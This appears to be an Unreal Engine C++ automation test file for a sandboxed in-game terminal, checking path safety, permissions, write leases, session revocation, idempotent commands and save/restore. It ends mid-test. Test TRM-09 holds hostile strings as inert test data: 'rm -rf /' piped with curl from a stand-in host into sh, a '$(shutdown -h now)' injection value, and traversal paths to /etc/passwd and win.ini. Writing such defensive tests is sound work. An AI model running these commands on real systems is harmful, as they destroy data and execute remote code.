#include "Misc/AutomationTest.h"

#if WITH_DEV_AUTOMATION_TESTS

#include "DocCoreTestUtils.h"
#include "DocTerminalTypes.h"
#include "DocTerminalDefinition.h"
#include "DocTerminalComponent.h"
#include "DocWorldTerminalSubsystem.h"
#include "GameplayTagsManager.h"
#include "Engine/World.h"
#include "GameFramework/Actor.h"

namespace DocTerminalTests
{
	constexpr EAutomationTestFlags Flags = EAutomationTestFlags_ApplicationContextMask | EAutomationTestFlags::ProductFilter;

	FGameplayTag GetOrCreateTestPermission(const FName& TagName = TEXT("Doc.Test.TerminalAdmin"))
	{
		UGameplayTagsManager& Mgr = UGameplayTagsManager::Get();
		FGameplayTag Tag = Mgr.RequestGameplayTag(TagName, false);
		if (!Tag.IsValid())
		{
			Tag = Mgr.AddNativeGameplayTag(TagName);
		}
		return Tag;
	}

	struct FFixture
	{
		FDocScopedTestWorld ScopedWorld;
		UWorld* World = nullptr;
		UDocWorldTerminalSubsystem* Subsystem = nullptr;

		FFixture()
		{
			World = ScopedWorld.World;
			Subsystem = World ? World->GetSubsystem<UDocWorldTerminalSubsystem>() : nullptr;
		}

		UDocTerminalDefinition* CreateDefinition(FName DeviceId, EDocTerminalExclusivity Exclusivity = EDocTerminalExclusivity::SingleWriter)
		{
			UDocTerminalDefinition* Def = NewObject<UDocTerminalDefinition>(GetTransientPackage());
			Def->DeviceId = DeviceId;
			Def->DeviceName = FText::FromName(DeviceId);
			Def->DefaultExclusivity = Exclusivity;
			return Def;
		}
	};
}

// TRM-01: Canonical paths, duplicates, traversal, and depth limits are enforced
IMPLEMENT_CUSTOM_SIMPLE_AUTOMATION_TEST(FDocTerminalVirtualPathSafetyTest, FAutomationTestBase, "Doc.Terminal.VirtualPathSafety", DocTerminalTests::Flags)
bool FDocTerminalVirtualPathSafetyTest::RunTest(const FString& Parameters)
{
	FString Norm;

	// Valid path normalization
	TestTrue(TEXT("Simple path"), DocTerminalUtils::NormalizeVirtualPath(TEXT("/system/logs/boot.log"), Norm));
	TestEqual(TEXT("Normalized simple path"), Norm, TEXT("/system/logs/boot.log"));

	// Redundant slashes and backslashes
	TestTrue(TEXT("Backslashes and redundant slashes"), DocTerminalUtils::NormalizeVirtualPath(TEXT("\\system\\\\logs\\boot.log"), Norm));
	TestEqual(TEXT("Normalized backslashes"), Norm, TEXT("/system/logs/boot.log"));

	// Dot relative segments
	TestTrue(TEXT("Current dir dots"), DocTerminalUtils::NormalizeVirtualPath(TEXT("/system/./logs/../config/settings.ini"), Norm));
	TestEqual(TEXT("Normalized dots"), Norm, TEXT("/system/config/settings.ini"));

	// Traversal outside root fails
	TestFalse(TEXT("Escape root fails"), DocTerminalUtils::NormalizeVirtualPath(TEXT("/../../secret.pass"), Norm));

	// Illegal character rejection
	TestFalse(TEXT("Disallow asterisks"), DocTerminalUtils::NormalizeVirtualPath(TEXT("/system/*.log"), Norm));
	TestFalse(TEXT("Disallow pipe"), DocTerminalUtils::NormalizeVirtualPath(TEXT("/system/bad|file"), Norm));

	// Depth limit (max 8 segments)
	FString DeepPath = TEXT("/1/2/3/4/5/6/7/8/9/overflow.txt");
	TestFalse(TEXT("Excessive depth rejected"), DocTerminalUtils::NormalizeVirtualPath(DeepPath, Norm));

	return true;
}

// TRM-02: Unauthorized filenames/content never enter ordinary view models
IMPLEMENT_CUSTOM_SIMPLE_AUTOMATION_TEST(FDocTerminalPermissionFilteredViewsTest, FAutomationTestBase, "Doc.Terminal.PermissionFilteredViews", DocTerminalTests::Flags)
bool FDocTerminalPermissionFilteredViewsTest::RunTest(const FString& Parameters)
{
	DocTerminalTests::FFixture Fixture;
	TestNotNull(TEXT("Subsystem valid"), Fixture.Subsystem);

	FName DevId = TEXT("KioskAlpha");
	UDocTerminalDefinition* Def = Fixture.CreateDefinition(DevId);

	// Public file
	FDocVirtualFile PubFile;
	PubFile.FileId = FGuid::NewGuid();
	PubFile.Path = TEXT("/docs/welcome.txt");
	PubFile.Content = TEXT("Welcome to Facility 4.");
	Def->InitialFiles.Add(PubFile);

	// Classified file requiring Admin permission
	FGameplayTag AdminTag = DocTerminalTests::GetOrCreateTestPermission();
	FDocVirtualFile SecretFile;
	SecretFile.FileId = FGuid::NewGuid();
	SecretFile.Path = TEXT("/docs/classified.txt");
	SecretFile.Content = TEXT("Super secret codes.");
	SecretFile.RequiredPermission = AdminTag;
	Def->InitialFiles.Add(SecretFile);

	Fixture.Subsystem->RegisterDevice(DevId, Def);

	// User without Admin permission opens session
	FDocOwnerScope GuestScope;
	GuestScope.Kind = EDocOwnerScopeKind::PlayerProfile;
	GuestScope.SubjectId = FGuid::NewGuid();
	FGameplayTagContainer GuestPerms;

	EDocTerminalSessionState State;
	FGuid GuestSession = Fixture.Subsystem->OpenSession(DevId, GuestScope, GuestPerms, State);
	TestTrue(TEXT("Guest session open"), GuestSession.IsValid());

	// List files in /docs: classified file must NOT appear!
	TArray<FDocVirtualFile> ListedFiles;
	Fixture.Subsystem->ListFiles(GuestSession, TEXT("/docs"), ListedFiles);
	TestEqual(TEXT("Only public file visible to guest"), ListedFiles.Num(), 1);
	if (ListedFiles.Num() == 1)
	{
		TestEqual(TEXT("Public file listed"), ListedFiles[0].Path, FString(TEXT("/docs/welcome.txt")));
	}

	// Attempt direct read of classified file by guest fails
	FDocVirtualFile ReadResult;
	bool bRead = Fixture.Subsystem->ReadFile(GuestSession, TEXT("/docs/classified.txt"), ReadResult);
	TestFalse(TEXT("Guest read of classified file rejected"), bRead);

	// User WITH Admin permission opens session
	FGameplayTagContainer AdminPerms;
	AdminPerms.AddTag(AdminTag);
	FGuid AdminSession = Fixture.Subsystem->OpenSession(DevId, GuestScope, AdminPerms, State);

	ListedFiles.Reset();
	Fixture.Subsystem->ListFiles(AdminSession, TEXT("/docs"), ListedFiles);
	TestEqual(TEXT("Admin sees both files"), ListedFiles.Num(), 2);

	bRead = Fixture.Subsystem->ReadFile(AdminSession, TEXT("/docs/classified.txt"), ReadResult);
	TestTrue(TEXT("Admin read succeeds"), bRead);
	TestEqual(TEXT("Content matches"), ReadResult.Content, FString(TEXT("Super secret codes.")));

	// Writes and deletes follow the same permission rule as reads
	TestTrue(TEXT("Guest takes the write lease"), Fixture.Subsystem->AcquireWriteLease(GuestSession));
	TestFalse(TEXT("Guest cannot overwrite a protected file"), Fixture.Subsystem->WriteFile(GuestSession, TEXT("/docs/classified.txt"), TEXT("pwned")));
	TestFalse(TEXT("Guest cannot delete a protected file"), Fixture.Subsystem->DeleteFile(GuestSession, TEXT("/docs/classified.txt")));
	TestFalse(TEXT("Guest cannot assign a permission it lacks"), Fixture.Subsystem->WriteFile(GuestSession, TEXT("/docs/mine.txt"), TEXT("x"), FText::GetEmpty(), AdminTag));
	TestTrue(TEXT("Guest can write an ordinary file"), Fixture.Subsystem->WriteFile(GuestSession, TEXT("/docs/notes.txt"), TEXT("hello")));
	TestFalse(TEXT("Oversized content is refused"), Fixture.Subsystem->WriteFile(GuestSession, TEXT("/docs/big.txt"),
		FString::ChrN(UDocWorldTerminalSubsystem::MaxFileContentLength + 1, TEXT('x'))));
	Fixture.Subsystem->ReleaseWriteLease(GuestSession);
	bRead = Fixture.Subsystem->ReadFile(AdminSession, TEXT("/docs/classified.txt"), ReadResult);
	TestEqual(TEXT("Protected content untouched"), ReadResult.Content, FString(TEXT("Super secret codes.")));

	// The public device summary never carries protected files or any file content
	FDocTerminalDeviceState Summary;
	TestTrue(TEXT("Summary"), Fixture.Subsystem->QueryDeviceState(DevId, Summary));
	TestFalse(TEXT("Summary hides protected files"), Summary.VirtualFiles.ContainsByPredicate([](const FDocVirtualFile& F) { return F.Path == TEXT("/docs/classified.txt"); }));
	TestFalse(TEXT("Summary carries no content"), Summary.VirtualFiles.ContainsByPredicate([](const FDocVirtualFile& F) { return !F.Content.IsEmpty(); }));

	return true;
}

// TRM-03: Unknown verbs/types, stale revisions, and revoked sessions fail safely
IMPLEMENT_CUSTOM_SIMPLE_AUTOMATION_TEST(FDocTerminalTypedCommandValidationTest, FAutomationTestBase, "Doc.Terminal.TypedCommandValidation", DocTerminalTests::Flags)
bool FDocTerminalTypedCommandValidationTest::RunTest(const FString& Parameters)
{
	DocTerminalTests::FFixture Fixture;
	const FName DevId = TEXT("ConsoleBeta");
	TestTrue(TEXT("Register"), Fixture.Subsystem->RegisterDevice(DevId, Fixture.CreateDefinition(DevId)));
	FDocOwnerScope Owner;
	Owner.Kind = EDocOwnerScopeKind::PlayerProfile;
	Owner.SubjectId = FGuid::NewGuid();
	EDocTerminalSessionState State;
	const FGuid SessionId = Fixture.Subsystem->OpenSession(DevId, Owner, FGameplayTagContainer(), State);
	FDocTerminalDeviceState Before;
	Fixture.Subsystem->QueryDeviceState(DevId, Before);

	FDocTerminalCommandRequest Status;
	Status.Verb = TEXT("status");
	TestTrue(TEXT("Known verb works (control)"), Fixture.Subsystem->ExecuteCommand(SessionId, Status).bSuccess);

	FDocTerminalCommandRequest Unknown;
	Unknown.Verb = TEXT("format_c_drive");
	const FDocTerminalCommandResult UnknownRes = Fixture.Subsystem->ExecuteCommand(SessionId, Unknown);
	TestFalse(TEXT("Unknown verb fails"), UnknownRes.bSuccess);
	TestTrue(TEXT("Explains why"), UnknownRes.OutputMessage.Contains(TEXT("Unknown")));

	FDocTerminalCommandRequest MissingArg;
	MissingArg.Verb = TEXT("get_setting");
	TestFalse(TEXT("Missing typed argument fails"), Fixture.Subsystem->ExecuteCommand(SessionId, MissingArg).bSuccess);

	FDocTerminalCommandRequest NoLease;
	NoLease.Verb = TEXT("set_setting");
	NoLease.Arguments.Add(TEXT("key"), TEXT("mode"));
	NoLease.Arguments.Add(TEXT("value"), TEXT("x"));
	TestFalse(TEXT("Mutation without a write lease fails"), Fixture.Subsystem->ExecuteCommand(SessionId, NoLease).bSuccess);

	FDocTerminalCommandRequest Stale = Status;
	Stale.ExpectedStateRevision = Before.StateRevision + 998;
	const FDocTerminalCommandResult StaleRes = Fixture.Subsystem->ExecuteCommand(SessionId, Stale);
	TestFalse(TEXT("Stale revision fails"), StaleRes.bSuccess);
	TestTrue(TEXT("Reports the mismatch"), StaleRes.OutputMessage.Contains(TEXT("revision")));

	FDocTerminalDeviceState After;
	Fixture.Subsystem->QueryDeviceState(DevId, After);
	TestEqual(TEXT("Failed commands mutate nothing"), After.StateRevision, Before.StateRevision);
	TestFalse(TEXT("No setting written"), After.DeviceSettings.Contains(TEXT("mode")));

	TestFalse(TEXT("Unknown session fails"), Fixture.Subsystem->ExecuteCommand(FGuid::NewGuid(), Status).bSuccess);
	Fixture.Subsystem->SetDevicePower(DevId, false);
	TestFalse(TEXT("Revoked session fails"), Fixture.Subsystem->ExecuteCommand(SessionId, Status).bSuccess);
	TestFalse(TEXT("Revoked session cannot take a lease"), Fixture.Subsystem->AcquireWriteLease(SessionId));
	Fixture.Subsystem->SetDevicePower(DevId, true);
	TestFalse(TEXT("Power restore does not revive the old session"), Fixture.Subsystem->ExecuteCommand(SessionId, Status).bSuccess);
	const FGuid Fresh = Fixture.Subsystem->OpenSession(DevId, Owner, FGameplayTagContainer(), State);
	TestTrue(TEXT("A new session works"), Fixture.Subsystem->ExecuteCommand(Fresh, Status).bSuccess);
	TestTrue(TEXT("Close"), Fixture.Subsystem->CloseSession(Fresh));
	TestFalse(TEXT("Closed session fails"), Fixture.Subsystem->ExecuteCommand(Fresh, Status).bSuccess);
	return true;
}

// TRM-04: Simultaneous sessions cannot acquire conflicting write ownership
IMPLEMENT_CUSTOM_SIMPLE_AUTOMATION_TEST(FDocTerminalSingleWriterTest, FAutomationTestBase, "Doc.Terminal.SingleWriter", DocTerminalTests::Flags)
bool FDocTerminalSingleWriterTest::RunTest(const FString& Parameters)
{
	DocTerminalTests::FFixture Fixture;
	FName DevId = TEXT("SharedConsole");
	UDocTerminalDefinition* Def = Fixture.CreateDefinition(DevId, EDocTerminalExclusivity::SingleWriter);
	Fixture.Subsystem->RegisterDevice(DevId, Def);

	FDocOwnerScope Owner1;
	Owner1.Kind = EDocOwnerScopeKind::PlayerProfile;
	Owner1.SubjectId = FGuid::NewGuid();

	FDocOwnerScope Owner2;
	Owner2.Kind = EDocOwnerScopeKind::PlayerProfile;
	Owner2.SubjectId = FGuid::NewGuid();

	EDocTerminalSessionState State;
	FGuid Sess1 = Fixture.Subsystem->OpenSession(DevId, Owner1, FGameplayTagContainer(), State);
	FGuid Sess2 = Fixture.Subsystem->OpenSession(DevId, Owner2, FGameplayTagContainer(), State);

	// Sess1 acquires write lease
	TestTrue(TEXT("Sess1 acquires write lease"), Fixture.Subsystem->AcquireWriteLease(Sess1));

	// Sess2 tries to acquire write lease while Sess1 owns it
	TestFalse(TEXT("Sess2 write lease denied while Sess1 owns it"), Fixture.Subsystem->AcquireWriteLease(Sess2));

	// Sess1 writes file successfully
	TestTrue(TEXT("Sess1 writes file"), Fixture.Subsystem->WriteFile(Sess1, TEXT("/data/log.txt"), TEXT("Entry 1")));

	// Sess2 cannot write file
	TestFalse(TEXT("Sess2 cannot write without lease"), Fixture.Subsystem->WriteFile(Sess2, TEXT("/data/log.txt"), TEXT("Entry 2")));

	// Sess1 releases lease
	TestTrue(TEXT("Sess1 releases lease"), Fixture.Subsystem->ReleaseWriteLease(Sess1));

	// Now Sess2 can acquire write lease
	TestTrue(TEXT("Sess2 acquires lease now"), Fixture.Subsystem->AcquireWriteLease(Sess2));
	TestTrue(TEXT("Sess2 writes file now"), Fixture.Subsystem->WriteFile(Sess2, TEXT("/data/log.txt"), TEXT("Entry 2")));

	return true;
}

// TRM-05: Closing UI cancels/releases session work without losing committed results
IMPLEMENT_CUSTOM_SIMPLE_AUTOMATION_TEST(FDocTerminalAsyncCloseTest, FAutomationTestBase, "Doc.Terminal.AsyncClose", DocTerminalTests::Flags)
bool FDocTerminalAsyncCloseTest::RunTest(const FString& Parameters)
{
	DocTerminalTests::FFixture Fixture;
	FName DevId = TEXT("TerminalGamma");
	UDocTerminalDefinition* Def = Fixture.CreateDefinition(DevId);
	Fixture.Subsystem->RegisterDevice(DevId, Def);

	FDocOwnerScope Owner;
	Owner.Kind = EDocOwnerScopeKind::PlayerProfile;
	Owner.SubjectId = FGuid::NewGuid();

	EDocTerminalSessionState State;
	FGuid Sess = Fixture.Subsystem->OpenSession(DevId, Owner, FGameplayTagContainer(), State);
	Fixture.Subsystem->AcquireWriteLease(Sess);

	// Commit a setting
	FDocTerminalCommandRequest Req;
	Req.Verb = TEXT("set_setting");
	Req.Arguments.Add(TEXT("key"), TEXT("baud_rate"));
	Req.Arguments.Add(TEXT("value"), TEXT("9600"));
	FDocTerminalCommandResult Res = Fixture.Subsystem->ExecuteCommand(Sess, Req);
	TestTrue(TEXT("Committed setting"), Res.bSuccess);

	// Close session
	TestTrue(TEXT("Closed session"), Fixture.Subsystem->CloseSession(Sess));

	// Session is closed and write lease is released
	FDocTerminalSession SessQuery;
	Fixture.Subsystem->QuerySession(Sess, SessQuery);
	TestEqual(TEXT("Session state is Closed"), SessQuery.State, EDocTerminalSessionState::Closed);
	TestFalse(TEXT("Write lease released"), SessQuery.bHasWriteLease);

	// Committed result is preserved on device
	FDocTerminalDeviceState DevState;
	Fixture.Subsystem->QueryDeviceState(DevId, DevState);
	const FString* Val = DevState.DeviceSettings.Find(TEXT("baud_rate"));
	TestNotNull(TEXT("Setting preserved"), Val);
	if (Val)
	{
		TestEqual(TEXT("Setting value intact"), *Val, FString(TEXT("9600")));
	}

	return true;
}

// TRM-06: Device loss revokes the correct session and cleans control leases
IMPLEMENT_CUSTOM_SIMPLE_AUTOMATION_TEST(FDocTerminalPowerAndUnloadTest, FAutomationTestBase, "Doc.Terminal.PowerAndUnload", DocTerminalTests::Flags)
bool FDocTerminalPowerAndUnloadTest::RunTest(const FString& Parameters)
{
	DocTerminalTests::FFixture Fixture;
	const FName DevA = TEXT("DevA");
	const FName DevB = TEXT("DevB");
	Fixture.Subsystem->RegisterDevice(DevA, Fixture.CreateDefinition(DevA));
	Fixture.Subsystem->RegisterDevice(DevB, Fixture.CreateDefinition(DevB));
	FDocOwnerScope Owner;
	Owner.Kind = EDocOwnerScopeKind::PlayerProfile;
	Owner.SubjectId = FGuid::NewGuid();
	EDocTerminalSessionState State;
	const FGuid SessA = Fixture.Subsystem->OpenSession(DevA, Owner, FGameplayTagContainer(), State);
	const FGuid SessB = Fixture.Subsystem->OpenSession(DevB, Owner, FGameplayTagContainer(), State);
	TestTrue(TEXT("A holds the write lease"), Fixture.Subsystem->AcquireWriteLease(SessA));
	TestTrue(TEXT("B holds the write lease"), Fixture.Subsystem->AcquireWriteLease(SessB));

	Fixture.Subsystem->SetDevicePower(DevA, false);
	FDocTerminalSession QueryA, QueryB;
	Fixture.Subsystem->QuerySession(SessA, QueryA);
	Fixture.Subsystem->QuerySession(SessB, QueryB);
	TestEqual(TEXT("Session on the unpowered device is revoked"), QueryA.State, EDocTerminalSessionState::Revoked);
	TestFalse(TEXT("Its lease is cleaned up"), QueryA.bHasWriteLease);
	TestEqual(TEXT("Other device's session unaffected"), QueryB.State, EDocTerminalSessionState::Active);
	TestTrue(TEXT("Other device's lease kept"), QueryB.bHasWriteLease);
	FDocTerminalDeviceState DevState;
	Fixture.Subsystem->QueryDeviceState(DevA, DevState);
	TestFalse(TEXT("Device has no writer"), DevState.ActiveWriterSessionId.IsValid());
	TestFalse(TEXT("Revoked session cannot write"), Fixture.Subsystem->WriteFile(SessA, TEXT("/tmp/a.txt"), TEXT("x")));
	FDocVirtualFile Ignored;
	TestFalse(TEXT("Revoked session cannot read"), Fixture.Subsystem->ReadFile(SessA, TEXT("/tmp/a.txt"), Ignored));
	TestFalse(TEXT("No new session on an unpowered device"), Fixture.Subsystem->OpenSession(DevA, Owner, FGameplayTagContainer(), State).IsValid());

	Fixture.Subsystem->SetDevicePower(DevA, true);
	const FGuid Again = Fixture.Subsystem->OpenSession(DevA, Owner, FGameplayTagContainer(), State);
	TestTrue(TEXT("New session after power returns"), Again.IsValid());
	TestTrue(TEXT("Lease is free for it"), Fixture.Subsystem->AcquireWriteLease(Again));

	TestTrue(TEXT("Unload device B"), Fixture.Subsystem->UnregisterDevice(DevB));
	Fixture.Subsystem->QuerySession(SessB, QueryB);
	TestEqual(TEXT("Unload revokes its sessions"), QueryB.State, EDocTerminalSessionState::Revoked);
	TestFalse(TEXT("And their leases"), QueryB.bHasWriteLease);
	return true;
}

// TRM-07: Repeated committed command keys do not duplicate external effects
IMPLEMENT_CUSTOM_SIMPLE_AUTOMATION_TEST(FDocTerminalCommandReceiptTest, FAutomationTestBase, "Doc.Terminal.CommandReceipt", DocTerminalTests::Flags)
bool FDocTerminalCommandReceiptTest::RunTest(const FString& Parameters)
{
	DocTerminalTests::FFixture Fixture;
	FName DevId = TEXT("DeviceLedger");
	UDocTerminalDefinition* Def = Fixture.CreateDefinition(DevId);
	Fixture.Subsystem->RegisterDevice(DevId, Def);

	FDocOwnerScope Owner;
	Owner.Kind = EDocOwnerScopeKind::PlayerProfile;
	Owner.SubjectId = FGuid::NewGuid();

	EDocTerminalSessionState State;
	FGuid Sess = Fixture.Subsystem->OpenSession(DevId, Owner, FGameplayTagContainer(), State);
	Fixture.Subsystem->AcquireWriteLease(Sess);

	FGuid IdempotencyKey = FGuid::NewGuid();

	FDocTerminalCommandRequest Req;
	Req.Verb = TEXT("set_setting");
	Req.Arguments.Add(TEXT("key"), TEXT("relay_state"));
	Req.Arguments.Add(TEXT("value"), TEXT("closed"));
	Req.IdempotencyKey = IdempotencyKey;

	// Execute first time
	FDocTerminalCommandResult Res1 = Fixture.Subsystem->ExecuteCommand(Sess, Req);
	TestTrue(TEXT("First execution succeeds"), Res1.bSuccess);
	int32 RevAfterFirst = Res1.CommittedRevision;

	// Execute second time with same IdempotencyKey
	FDocTerminalCommandResult Res2 = Fixture.Subsystem->ExecuteCommand(Sess, Req);
	TestTrue(TEXT("Second execution returns cached success"), Res2.bSuccess);
	TestEqual(TEXT("Committed revision did not increment twice"), Res2.CommittedRevision, RevAfterFirst);

	FDocTerminalDeviceState DevState;
	Fixture.Subsystem->QueryDeviceState(DevId, DevState);
	TestEqual(TEXT("StateRevision matches Res1 committed rev"), DevState.StateRevision, RevAfterFirst);

	// Same key, different payload: conflict, nothing executes
	FDocTerminalCommandRequest Changed = Req;
	Changed.Arguments[TEXT("value")] = TEXT("open");
	FDocTerminalCommandResult ResChanged = Fixture.Subsystem->ExecuteCommand(Sess, Changed);
	TestFalse(TEXT("Reused key with a different payload is refused"), ResChanged.bSuccess);

	// Another owner replaying the key does not receive the stored result
	FDocOwnerScope Other;
	Other.Kind = EDocOwnerScopeKind::PlayerProfile;
	Other.SubjectId = FGuid::NewGuid();
	FGuid OtherSess = Fixture.Subsystem->OpenSession(DevId, Other, FGameplayTagContainer(), State);
	TestFalse(TEXT("Replay by another owner is refused"), Fixture.Subsystem->ExecuteCommand(OtherSess, Req).bSuccess);

	// A revoked session replaying its own key gets nothing either
	Fixture.Subsystem->SetDevicePower(DevId, false);
	TestFalse(TEXT("Revoked session replay is refused"), Fixture.Subsystem->ExecuteCommand(Sess, Req).bSuccess);
	Fixture.Subsystem->SetDevicePower(DevId, true);

	// After save/restore the key is still honoured: the command never runs twice
	FDocTerminalDeviceState Saved = Fixture.Subsystem->CaptureDeviceState(DevId);
	Fixture.Subsystem->UnregisterDevice(DevId);
	Fixture.Subsystem->RegisterDevice(DevId, Def);
	Fixture.Subsystem->StageRestoreDeviceState(Saved);
	FGuid Resumed = Fixture.Subsystem->OpenSession(DevId, Owner, FGameplayTagContainer(), State);
	Fixture.Subsystem->AcquireWriteLease(Resumed);
	FDocTerminalDeviceState BeforeReplay;
	Fixture.Subsystem->QueryDeviceState(DevId, BeforeReplay);
	FDocTerminalCommandResult AfterRestore = Fixture.Subsystem->ExecuteCommand(Resumed, Req);
	FDocTerminalDeviceState AfterReplay;
	Fixture.Subsystem->QueryDeviceState(DevId, AfterReplay);
	TestTrue(TEXT("Replay after restore reports committed"), AfterRestore.bSuccess);
	TestEqual(TEXT("Replay after restore does not execute again"), AfterReplay.StateRevision, BeforeReplay.StateRevision);

	return true;
}

// TRM-08: Restore retains data without replaying history or privileged sessions
IMPLEMENT_CUSTOM_SIMPLE_AUTOMATION_TEST(FDocTerminalRestoreNoCommandsTest, FAutomationTestBase, "Doc.Terminal.RestoreNoCommands", DocTerminalTests::Flags)
bool FDocTerminalRestoreNoCommandsTest::RunTest(const FString& Parameters)
{
	DocTerminalTests::FFixture Fixture;
	const FName DevId = TEXT("RestoreDev");
	UDocTerminalDefinition* Def = Fixture.CreateDefinition(DevId);
	Fixture.Subsystem->RegisterDevice(DevId, Def);
	FDocOwnerScope Owner;
	Owner.Kind = EDocOwnerScopeKind::PlayerProfile;
	Owner.SubjectId = FGuid::NewGuid();
	EDocTerminalSessionState State;
	const FGuid Sess = Fixture.Subsystem->OpenSession(DevId, Owner, FGameplayTagContainer(), State);
	Fixture.Subsystem->AcquireWriteLease(Sess);
	TestTrue(TEXT("Write file"), Fixture.Subsystem->WriteFile(Sess, TEXT("/boot/config.sys"), TEXT("DEVICE=HIGH")));
	FDocTerminalCommandRequest SetA;
	SetA.Verb = TEXT("set_setting");
	SetA.Arguments.Add(TEXT("key"), TEXT("mode"));
	SetA.Arguments.Add(TEXT("value"), TEXT("A"));
	SetA.IdempotencyKey = FGuid::NewGuid();
	TestTrue(TEXT("Committed command before save"), Fixture.Subsystem->ExecuteCommand(Sess, SetA).bSuccess);

	const FDocTerminalDeviceState Saved = Fixture.Subsystem->CaptureDeviceState(DevId);
	TestFalse(TEXT("Save holds no writer session"), Saved.ActiveWriterSessionId.IsValid());
	Fixture.Subsystem->UnregisterDevice(DevId);
	Fixture.Subsystem->RegisterDevice(DevId, Def);
	TestTrue(TEXT("Restore succeeded"), Fixture.Subsystem->StageRestoreDeviceState(Saved));

	FDocTerminalDeviceState Restored;
	Fixture.Subsystem->QueryDeviceState(DevId, Restored);
	TestFalse(TEXT("No privileged writer after restore"), Restored.ActiveWriterSessionId.IsValid());
	TestEqual(TEXT("Revision kept"), Restored.StateRevision, Saved.StateRevision);
	FDocTerminalSession OldSession;
	Fixture.Subsystem->QuerySession(Sess, OldSession);
	TestTrue(TEXT("Pre-restore session is not live"), OldSession.State != EDocTerminalSessionState::Active);

	const FGuid NewSession = Fixture.Subsystem->OpenSession(DevId, Owner, FGameplayTagContainer(), State);
	FDocVirtualFile File;
	TestTrue(TEXT("Read restored file"), Fixture.Subsystem->ReadFile(NewSession, TEXT("/boot/config.sys"), File));
	TestEqual(TEXT("Content matches"), File.Content, FString(TEXT("DEVICE=HIGH")));

	Fixture.Subsystem->AcquireWriteLease(NewSession);
	FDocTerminalCommandRequest SetC = SetA;
	SetC.IdempotencyKey = FGuid::NewGuid();
	SetC.Arguments.Add(TEXT("value"), TEXT("C"));
	TestTrue(TEXT("New command"), Fixture.Subsystem->ExecuteCommand(NewSession, SetC).bSuccess);
	const FDocTerminalCommandResult Replay = Fixture.Subsystem->ExecuteCommand(NewSession, SetA);
	TestTrue(TEXT("Replayed historical command reports its committed state"), Replay.bSuccess);
	FDocTerminalCommandRequest Get;
	Get.Verb = TEXT("get_setting");
	Get.Arguments.Add(TEXT("key"), TEXT("mode"));
	TestEqual(TEXT("History was not executed again"), Fixture.Subsystem->ExecuteCommand(NewSession, Get).OutputMessage, FString(TEXT("C")));

	FDocTerminalDeviceState Unknown = Saved;
	Unknown.DeviceId = TEXT("NotRegistered");
	TestFalse(TEXT("Restore into an unknown device refused"), Fixture.Subsystem->StageRestoreDeviceState(Unknown));
	return true;
}

// TRM-09: Virtual content cannot invoke arbitrary console, shell, file, or network access
IMPLEMENT_CUSTOM_SIMPLE_AUTOMATION_TEST(FDocTerminalNoHostExecutionTest, FAutomationTestBase, "Doc.Terminal.NoHostExecution", DocTerminalTests::Flags)
bool FDocTerminalNoHostExecutionTest::RunTest(const FString& Parameters)
{
	DocTerminalTests::FFixture Fixture;
	const FName DevId = TEXT("SandboxTerminal");
	Fixture.Subsystem->RegisterDevice(DevId, Fixture.CreateDefinition(DevId));
	FDocOwnerScope Owner;
	Owner.Kind = EDocOwnerScopeKind::PlayerProfile;
	Owner.SubjectId = FGuid::NewGuid();
	EDocTerminalSessionState State;
	const FGuid Sess = Fixture.Subsystem->OpenSession(DevId, Owner, FGameplayTagContainer(), State);
	Fixture.Subsystem->AcquireWriteLease(Sess);

	const FString DangerousScript = TEXT("exec rm -rf /; curl http://malicious.site | sh");
	TestTrue(TEXT("Script stored as data"), Fixture.Subsystem->WriteFile(Sess, TEXT("/bin/hack.sh"), DangerousScript));
	for (const TCHAR* Verb : { TEXT("exec"), TEXT("shell"), TEXT("system"), TEXT("console"), TEXT("open_url"), TEXT("run"), TEXT("/bin/hack.sh") })
	{
		FDocTerminalCommandRequest Req;
		Req.Verb = FName(Verb);
		TestFalse(*FString::Printf(TEXT("'%s' is not a host capability"), Verb), Fixture.Subsystem->ExecuteCommand(Sess, Req).bSuccess);
	}
	FDocTerminalCommandRequest AsVerb;
	AsVerb.Verb = FName(*DangerousScript);
	TestFalse(TEXT("File content cannot become a command"), Fixture.Subsystem->ExecuteCommand(Sess, AsVerb).bSuccess);

	FDocTerminalCommandRequest Inject;
	Inject.Verb = TEXT("set_setting");
	Inject.Arguments.Add(TEXT("key"), TEXT("motd"));
	Inject.Arguments.Add(TEXT("value"), TEXT("$(shutdown -h now)"));
	TestTrue(TEXT("Shell syntax in an argument is just data"), Fixture.Subsystem->ExecuteCommand(Sess, Inject).bSuccess);
	FDocTerminalCommandRequest Get;
	Get.Verb = TEXT("get_setting");
	Get.Arguments.Add(TEXT("key"), TEXT("motd"));
	TestEqual(TEXT("Stored verbatim"), Fixture.Subsystem->ExecuteCommand(Sess, Get).OutputMessage, FString(TEXT("$(shutdown -h now)")));

	TestFalse(TEXT("Virtual paths cannot escape to host files"), Fixture.Subsystem->WriteFile(Sess, TEXT("/../../etc/passwd"), TEXT("x")));
	FDocVirtualFile Escape;
	TestFalse(TEXT("Nor be read"), Fixture.Subsystem->ReadFile(Sess, TEXT("/../../../Windows/win.ini"), Escape));
	FDocVirtualFile ReadBack;
	TestTrue(TEXT("File is passive data"), Fixture.Subsystem->ReadFile(Sess, TEXT("/bin/hack.sh"), ReadBack));
	TestEqual(TEXT("Content unchanged"), ReadBack.Content, DangerousScript);
	return true;
}

// TRM-10: Headless API and generic cooked front end work independently
IMPLEMENT_CUSTOM_SIMPLE_AUTOMATION_TEST(FDocTerminalHeadlessAndExampleTest, FAutomationTestBase, "Doc.Terminal.HeadlessAndExample", DocTerminalTests::Flags)
bool FDocTerminalHeadlessAndExampleTest::RunTest(const FString& Parameters)
{
	DocTerminalTests::FFixture Fixture;
	FDocOwnerScope Owner;
	Owner.Kind = EDocOwnerScopeKind::PlayerProfile;
	Owner.SubjectId = FGuid::NewGuid();
	// Headless: no actor, no component, no UI.
	const FName Headless = TEXT("HeadlessBox");
	TestTrue(TEXT("Register headless device"), Fixture.Subsystem->RegisterDevice(Headless, Fixture.CreateDefinition(Headless)));
	EDocTerminalSessionState State;
	const FGuid HeadlessSession = Fixture.Subsystem->OpenSession(Headless, Owner, FGameplayTagContainer(), State);
	TestTrue(TEXT("Headless session"), HeadlessSession.IsValid() && State == EDocTerminalSessionState::Active);
	TestTrue(TEXT("Headless lease"), Fixture.Subsystem->AcquireWriteLease(HeadlessSession));
	TestTrue(TEXT("Headless write"), Fixture.Subsystem->WriteFile(HeadlessSession, TEXT("/notes/today.txt"), TEXT("hello")));
	FDocVirtualFile Note;
	TestTrue(TEXT("Headless read"), Fixture.Subsystem->ReadFile(HeadlessSession, TEXT("/notes/today.txt"), Note) && Note.Content == TEXT("hello"));
